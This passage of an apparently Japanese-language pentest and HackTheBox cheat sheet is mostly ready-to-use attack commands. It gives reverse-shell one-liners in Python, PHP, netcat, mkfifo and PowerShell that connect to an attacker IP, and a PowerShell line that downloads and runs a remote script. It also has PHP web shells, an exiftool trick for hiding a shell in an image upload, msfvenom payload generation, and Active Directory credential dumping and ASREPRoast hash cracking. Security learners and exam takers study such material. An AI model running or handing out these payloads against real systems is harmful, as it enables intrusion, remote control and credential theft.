socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'</span>\n\n<span class=\"token comment\"># PHP</span>\nphp -r <span class=\"token string\">'$sock=fsockopen(\"10.10.10.1\",4444);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'</span>\n\n<span class=\"token operator\">&lt;</span>?php system<span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> ?<span class=\"token operator\">></span>\n\n<span class=\"token function\">curl</span> <span class=\"token string\">\"http://10.10.11.116/webshell.php\"</span> --data-urlencode <span class=\"token string\">\"cmd=bash -c '/bin/bash -l > /dev/tcp/10.10.16.7/4444 0&lt;&amp;1 2>&amp;1'\"</span>\n\n<span class=\"token comment\"># Netcat</span>\n<span class=\"token function\">nc</span> -e /bin/sh <span class=\"token number\">10.10</span>.10.1 <span class=\"token number\">4444</span>\nnc.exe -nv <span class=\"token number\">10.10</span>.10.1 <span class=\"token number\">4444</span> -e cmd.exe\n\n<span class=\"token comment\"># Unix</span>\n<span class=\"token function\">rm</span> /tmp/f<span class=\"token punctuation\">;</span><span class=\"token function\">mkfifo</span> /tmp/f<span class=\"token punctuation\">;</span><span class=\"token function\">cat</span> /tmp/f<span class=\"token operator\">|</span>/bin/sh -i <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span><span class=\"token file-descriptor important\">&amp;1</span><span class=\"token operator\">|</span><span class=\"token function\">nc</span> <span class=\"token number\">10.10</span>.10.1 <span class=\"token number\">4444</span> <span class=\"token operator\">></span>/tmp/f\n\n<span class=\"token comment\"># PowerShell</span>\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient<span class=\"token punctuation\">(</span><span class=\"token string\">\"10.10.10.1\"</span>,4444<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$stream</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$client</span>.GetStream<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">[</span>byte<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token variable\">$bytes</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">..</span><span class=\"token number\">65535</span><span class=\"token operator\">|</span>%<span class=\"token punctuation\">{</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">while</span><span class=\"token variable\"><span class=\"token punctuation\">((</span>$i <span class=\"token operator\">=</span> $stream.Read<span class=\"token punctuation\">(</span>$bytes<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> $bytes.Length<span class=\"token punctuation\">))</span></span> -ne <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class=\"token punctuation\">)</span>.GetString<span class=\"token punctuation\">(</span><span class=\"token variable\">$bytes</span>,0, <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$sendback</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>iex <span class=\"token variable\">$data</span> <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span><span class=\"token file-descriptor important\">&amp;1</span> <span class=\"token operator\">|</span> Out-String <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$sendback2</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$sendback</span> + <span class=\"token string\">\"PS \"</span> + <span class=\"token punctuation\">(</span>pwd<span class=\"token punctuation\">)</span>.Path + <span class=\"token string\">\"> \"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$sendbyte</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>text.encoding<span class=\"token punctuation\">]</span>::ASCII<span class=\"token punctuation\">)</span>.GetBytes<span class=\"token punctuation\">(</span><span class=\"token variable\">$sendback2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$stream</span>.Write<span class=\"token punctuation\">(</span><span class=\"token variable\">$sendbyte</span>,0,<span class=\"token variable\">$sendbyte</span>.Length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$stream</span>.Flush<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$client</span>.Close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\npowershell IEX <span class=\"token punctuation\">(</span>New-Object Net.WebClient<span class=\"token punctuation\">)</span>.DownloadString<span class=\"token punctuation\">(</span><span class=\"token string\">'http://10.10.10.1:5000/mini-reverse.ps1'</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>参考：<a href=\"https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Reverse Shell Cheat Sheet | pentestmonkey</a></p>\n<p>参考：<a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">PayloadsAllTheThings/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings</a></p>\n<p>参考：<a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Reverse Shell Cheat Sheet: PHP, Python, Powershell, Bash, NC, JSP, Java, Perl</a></p>\n<p>参考：<a href=\"https://oscp.infosecsanyam.in/shells/reverse-shell-cheat-sheet\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Reverse Shell Cheat Sheet - OSCP</a></p>\n<p>参考：<a href=\"https://cheatsheet.haax.fr/windows-systems/exploitation/iis/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Offensive Security Cheatsheet</a></p>\n<p>参考：<a href=\"https://github.com/kash1064/PayloadsAllTheThings?organization=kash1064&#x26;organization=kash1064\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">kash1064/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF</a></p>\n<h3 id=\"ペイロードの生成\" style=\"position:relative;\"><a href=\"#%E3%83%9A%E3%82%A4%E3%83%AD%E3%83%BC%E3%83%89%E3%81%AE%E7%94%9F%E6%88%90\" aria-label=\"ペイロードの生成 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ペイロードの生成</h3>\n<ul>\n<li>msfvenomはOSCPでも使用可能</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">$ <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">ip</span> addr <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> -E -o <span class=\"token string\">\"10.10.([0-9]{1,3}[\\.]){1}[0-9]{1,3}\"</span><span class=\"token variable\">`</span></span>\n\n<span class=\"token comment\"># IIS</span>\n<span class=\"token comment\"># ASP(.asp)はインタプリタ方式、ASP.NET(.aspx)はコンパイラ方式</span>\n$ msfvenom -f aspx -p windows/shell_reverse_tcp <span class=\"token assign-left variable\">LHOST</span><span class=\"token operator\">=</span><span class=\"token variable\">$LHOST</span> <span class=\"token assign-left variable\">LPORT</span><span class=\"token operator\">=</span><span class=\"token number\">4444</span> -o rev.aspx</code></pre></div>\n<p>参考：<a href=\"https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">MSFVenom Reverse Shell Payload Cheatsheet (with &#x26; without Meterpreter) | Infinite Logins</a></p>\n<h3 id=\"ssh\" style=\"position:relative;\"><a href=\"#ssh\" aria-label=\"ssh permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSH</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># 鍵の復号</span>\nopenssl rsa -in encrypted -out decrypted</code></pre></div>\n<ul>\n<li>SSHで<code class=\"language-text\">sign_and_send_pubkey: no mutual signature supported</code>が出る場合は古いSSHを使う</li>\n</ul>\n<h2 id=\"スキャンツールまとめ\" style=\"position:relative;\"><a href=\"#%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%84%E3%83%BC%E3%83%AB%E3%81%BE%E3%81%A8%E3%82%81\" aria-label=\"スキャンツールまとめ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>スキャンツールまとめ</h2>\n<h3 id=\"ポートスキャン\" style=\"position:relative;\"><a href=\"#%E3%83%9D%E3%83%BC%E3%83%88%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\" aria-label=\"ポートスキャン permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ポートスキャン</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># フィルタされたポートの探索</span>\n<span class=\"token function\">sudo</span> nmap -sU -sT -T4 targethost.htb<span class=\"token operator\">|</span> <span class=\"token function\">tee</span> nmap-filtered.txt\n\n<span class=\"token comment\"># OS Scan</span>\n<span class=\"token function\">sudo</span> nmap -p- targethost.htb -Pn -sC -sV -A -O --osscan-guess <span class=\"token operator\">|</span> <span class=\"token function\">tee</span> nmap-os.txt\n\n<span class=\"token comment\"># IPv6スキャン</span>\nnmap -sV -sC -T4 -6 dead:beef:0000:0000:0250:56ff:feb9:ba95 <span class=\"token operator\">|</span> <span class=\"token function\">tee</span> nmap-ipv6.txt\n\n<span class=\"token comment\"># Rustscan</span>\nrustscan --ulimit <span class=\"token number\">5000</span> -a targethost.htb <span class=\"token operator\">|</span> <span class=\"token function\">tee</span> rustscan.txt\n<span class=\"token function\">sed</span> -r <span class=\"token string\">\"s/<span class=\"token entity\" title=\"\\x1B\">\\x1B</span>\\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g\"</span> rustscan.txt <span class=\"token operator\">></span> rustscan.txt</code></pre></div>\n<h3 id=\"データベースのスキャン\" style=\"position:relative;\"><a href=\"#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\" aria-label=\"データベースのスキャン permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>データベースのスキャン</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># MySQL(DB/Table/Data)のダンプ</span>\nmysqldump -u USER_NAME -p -h HOST_NAME DB_NAME <span class=\"token operator\">></span> OUTPUT_FILE_NAME\nmysqldump -u USER_NAME -p -h HOST_NAME DB_NAME TABLE_NAME <span class=\"token operator\">></span> OUTPUT_FILE_NAME\nmysqldump -u USER_NAME -p -h HOST_NAME -A -n <span class=\"token operator\">></span> OUTPUT_FILE_NAME </code></pre></div>\n<h3 id=\"windowssambaシステムのスキャン\" style=\"position:relative;\"><a href=\"#windowssamba%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\" aria-label=\"windowssambaシステムのスキャン permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows/Sambaシステムのスキャン</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># enum4linux</span>\nenum4linux targethost.htb\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span>-- \n    -U  get userlist\n    -M  get machine list\n    -N  get namelist dump <span class=\"token punctuation\">(</span>different from -U and-M<span class=\"token punctuation\">)</span>\n    -S  get sharelist\n    -P  get password policy information\n    -G  get group and member list\n    -A  all of the above <span class=\"token punctuation\">(</span>full basic enumeration<span class=\"token punctuation\">)</span> --<span class=\"token operator\">></span>\n    \n<span class=\"token comment\"># SMBの探索</span>\ncrackmapexec smb targethost.htb\ncrackmapexec smb targethost.htb -u user-p <span class=\"token string\">'password'</span>\n\n<span class=\"token comment\"># AD環境 (SMB共有の列挙)</span>\nsmbmap -H targethost.htb -d Domain -u user -p pass\nsmbclient -L //targethost.domain/ -U user</code></pre></div>\n<ul>\n<li>ポート139と445が開いている場合はSMBが実行されている可能性が高い。</li>\n<li>ワークグループ名、サーバーがnullセッションを許可するかどうか。システムに存在するユーザーに関する情報を取得できる。</li>\n<li>print <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mtext>、</mtext><mi>I</mi><mi>P</mi><mi>C</mi></mrow><annotation encoding=\"application/x-tex\">、IPC</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord cjk_fallback\">、</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">PC</span></span></span></span>、ADMIN $などのデフォルトの共有だけでなく、 optやtmpなどのカスタム共有の情報も取得できる。</li>\n<li>パスワードポリシー、資格情報が取得できる。</li>\n</ul>\n<p>参考：<a href=\"https://www.kali.org/tools/enum4linux/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">enum4linux | Kali Linux Tools</a></p>\n<p>参考：<a href=\"https://null-byte.wonderhowto.com/how-to/enumerate-smb-with-enum4linux-smbclient-0198049/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Enum4linuxとSmbclientを使用してSMBを列挙する方法«ヌルバイト::WonderHowTo</a></p>\n<p>参考：<a href=\"https://github.com/byt3bl33d3r/CrackMapExec\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">byt3bl33d3r/CrackMapExec: A swiss army knife for pentesting networks</a></p>\n<p>参考：<a href=\"https://github.com/ShawnDEvans/smbmap\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ShawnDEvans/smbmap: SMBMap is a handy SMB enumeration tool</a></p>\n<h3 id=\"active-directory環境のスキャン\" style=\"position:relative;\"><a href=\"#active-directory%E7%92%B0%E5%A2%83%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\" aria-label=\"active directory環境のスキャン permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Active Directory環境のスキャン</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># DomainNameをhostsに追加しておく(enum4linux や Nmap でドメインが特定されている状態で使用)</span>\n./kerbrute_linux_386 userenum -t <span class=\"token number\">20</span> -d domain.local --dc domain.local /usr/share/wordlists/metasploit/unix_users.txt\n\n<span class=\"token comment\"># impacketのexamples/secretsdump.py(DRSUAPI)によるダンプの取得</span>\npython3 examples/secretsdump.py DOMAIN/backup:PASS@10.10.10.0\n<span class=\"token comment\"># [*] Using the DRSUAPI method to get NTDS.DIT secrets</span>\n<span class=\"token comment\"># Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::</span>\n\n<span class=\"token comment\"># impacketのexamples/GetNPUsers.pyによるASREPRoast攻撃</span>\npython3 examples/GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast\n\n<span class=\"token comment\"># GetNPUsers.pyの出力はハッシュで返されるので、以下のHashcatで解析できる</span>\nhashcat -a <span class=\"token number\">0</span> -m <span class=\"token number\">18200</span> ./hash.txt /usr/share/wordlists/rockyou.txt</code></pre></div>\n<ul>\n<li>Kerberosの事前認証を悪用することにより、有効なActiveDirectoryユーザーをブルートフォースおよび列挙することができる。</li>\n<li>ドメインコントローラーのバックアップアカウント(buckup)などの権限を取得した場合、DC内のすべてのアカウントのパスワードハッシュを取得できる可能性がある。</li>\n<li>Ntds.ditファイル（ActiveDirectoryデータを格納するデータベース）を取得できた場合は、mimikatzやHashcatでパスワードを復号できる可能性がある。(DRSUAPIでダンプを取得)</li>\n<li>ASREPRoast は、Kerberos事前認証が必要な属性(DONT<em>REQ</em>PREAUTH)を持たないユーザを探し、悪用する攻撃。</li>\n</ul>\n<p>参考：<a href=\"https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">UserAccountControl property flags - Windows Server | Microsoft Docs</a></p>\n<p>参考：<a href=\"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ASREPRoast - HackTricks</a></p>\n<h3 id=\"web脆弱性スキャン\" style=\"position:relative;\"><a href=\"#web%E8%84%86%E5%BC%B1%E6%80%A7%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3\" aria-label=\"web脆弱性スキャン permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Web脆弱性スキャン</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># nikto</span>\nnikto --url targethost.htb <span class=\"token operator\">|</span> <span class=\"token function\">tee</span> nikto.txt\n\n<span class=\"token comment\"># OWASP ZAP</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> zaproxy -y\n\n<span class=\"token comment\"># SQL injection scan</span>\npython3 sqlmap.py -u <span class=\"token string\">\"http://targethost.htb/\"</span> --data <span class=\"token string\">\"username=test&amp;country=Ukraine\"</span>\n\n<span class=\"token comment\"># WPScan</span>\nwpscan --url http://targethost.htb --enumerate u,cb,m,vp <span class=\"token operator\">|</span> <span class=\"token function\">tee</span> wpscan.txt</code></pre></div>\n<p>参考：<a href=\"https://github.com/sullo/nikto\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">sullo/nikto: Nikto web server scanner</a></p>\n<p>参考：<a href=\"https://www.zaproxy.org/getting-started/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OWASP ZAP – Getting Started</a></p>\n<p>参考：<a href=\"https://github.com/sqlmapproject/sqlmap\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">sqlmapproject/sqlmap: Automatic SQL injection and database takeover tool</a></p>\n<p>参考：<a href=\"/hackthebox-linux-validation#second-order-sql-injection\">Second Order SQL injection / UNION injection</a></p>\n<p>参考：<a href=\"https://qiita.com/koujimatsuda11/items/d49e8642dea1a1b0d067\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">WPScanを使ってWordpressをスキャンする - Qiita</a></p>\n<h2 id=\"webエクスプロイトまとめ\" style=\"position:relative;\"><a href=\"#web%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88%E3%81%BE%E3%81%A8%E3%82%81\" aria-label=\"webエクスプロイトまとめ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Webエクスプロイトまとめ</h2>\n<h3 id=\"web-shellを使う\" style=\"position:relative;\"><a href=\"#web-shell%E3%82%92%E4%BD%BF%E3%81%86\" aria-label=\"web shellを使う permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Web Shellを使う</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token comment\"># PHPを埋め込める場合</span>\n<span class=\"token operator\">&lt;</span>?php SYSTEM<span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> ?<span class=\"token operator\">></span>\n\n<span class=\"token comment\"># exiftoolで埋め込む場合</span>\nexiftool -documentname<span class=\"token operator\">=</span><span class=\"token string\">'&lt;?php system($_GET['</span>cmd<span class=\"token string\">']); ?>'</span> test.jpg\n<span class=\"token function\">mv</span> test.jpg test.php.jpg\n\n<span class=\"token comment\"># Shellを呼び出す</span>\n<span class=\"token function\">curl</span> -G --data-urlencode <span class=\"token string\">\"cmd=bash -c '/bin/bash -l > /dev/tcp/10.10.10.2/4444 0&lt;&amp;1 2>&amp;1'\"</span> http://target.htb/test.php.jpg <span class=\"token operator\">|</span> <span class=\"token function\">cat</span></code></pre></div>\n<p>参考：<a href=\"/hackthebox-linux-networked#exiftool%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%ABphp%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%82%92%E5%9F%8B%E3%82%81%E8%BE%BC%E3%82%80\">File Upload Filter Bypass: exiftoolを使って画像ファイルにphpスクリプトを埋め込む</a></p>\n<h3 id=\"sql-injection\" style=\"position:relative;\"><a href=\"#sql-injection\" aria-label=\"sql injection permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQL injection</h3>\n<div class=\"gatsby-highlight\" 